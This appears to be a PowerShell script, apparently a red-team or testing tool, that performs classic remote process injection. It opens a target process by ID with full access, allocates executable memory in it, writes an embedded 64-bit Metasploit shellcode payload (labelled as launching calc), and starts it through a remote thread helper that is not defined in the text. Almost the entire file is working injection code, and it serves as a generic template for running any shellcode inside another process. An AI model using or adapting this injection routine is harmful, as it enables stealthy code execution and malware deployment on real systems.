
function Invoke-Test
{
[CmdletBinding()]
    Param
    (
         [Parameter(Mandatory=$true)]
         [UInt32] $ProcessId
    )

    Add-Type -TypeDefinition @"
	    using System;
	    using System.Diagnostics;
	    using System.Runtime.InteropServices;
	
	    public static class Test
	    {
    
         public static UInt32 Open( uint ProcessId)		
         {
            IntPtr hProcess64 = Kernel32Imports.OpenProcess(Kernel32Imports.PROCESS_ALL_ACCESS, false, ProcessId);
            return (UInt32)hProcess64;
         }

         public static UInt32 Inject(byte[] shellcode, UInt32 hProcess64)
         {
           
            IntPtr pBaseAddress64 = Kernel32Imports.VirtualAllocEx(hProcess64, IntPtr.Zero, new UIntPtr((uint)shellcode.Length), Kernel32Imports.AllocationType.COMMIT, Kernel32Imports.MemoryProtection.EXECUTE_READWRITE);
            IntPtr dwSize64 = IntPtr.Zero;
            Kernel32Imports.WriteProcessMemory(hProcess64, pBaseAddress64, shellcode, shellcode.Length, out dwSize64);
            return (UInt32)pBaseAddress64;
         }


         public static class Kernel32Imports
         {
                // CreateRemoteThread, since ThreadProc is in remote process, we must use a raw function-pointer.
                [DllImport("kernel32")]
                public static extern IntPtr CreateRemoteThread(
                    UInt32 hProcess,
                    IntPtr lpThreadAttributes,
                    uint dwStackSize,
                    IntPtr lpStartAddress, // raw Pointer into remote process
                    IntPtr lpParameter,
                    uint dwCreationFlags,
                    out uint lpThreadId
                );

                [DllImport("kernel32.dll", SetLastError = true)]
                public static extern bool WriteProcessMemory(
                    UInt32 hProcess,
                    IntPtr lpBaseAddress,
                    byte[] lpBuffer,
                    int nSize,
                    out IntPtr lpNumberOfBytesWritten);

                [DllImport("kernel32")]
                public static extern IntPtr VirtualAllocEx(UInt32 hProcess, IntPtr lpAddress, UIntPtr dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

                [DllImport("kernel32")]
                public static extern IntPtr GetCurrentProcess();

                public const uint PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFF;
                [DllImport("kernel32")]
                public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

                [DllImport("kernel32")]
                [return: MarshalAs(UnmanagedType.Bool)]
                public static extern bool CloseHandle(UInt32 hObject);
    
                [Flags()]
                public enum AllocationType : uint
                {
                    COMMIT = 0x1000,
                    RESERVE = 0x2000,
                }

                [Flags()]
                public enum MemoryProtection : uint
                {
                    EXECUTE_READWRITE = 0x40,
                }

            } 

	    }
"@


   
    # 64-bit payload
    # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
    [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                              0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                              0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                              0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                              0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                              0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                              0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                              0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                              0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                              0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                              0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                              0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                              0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                              0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                              0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
    

    
    $ProcesHandle = [Test]::Open($ProcessId)
    $StartRoutine = [Test]::Inject( $Shellcode64, $ProcesHandle )
    Invoke-CreateRemoteThread64 -ProcessHandle $ProcesHandle -ThreadStartRoutine $StartRoutine
    

}
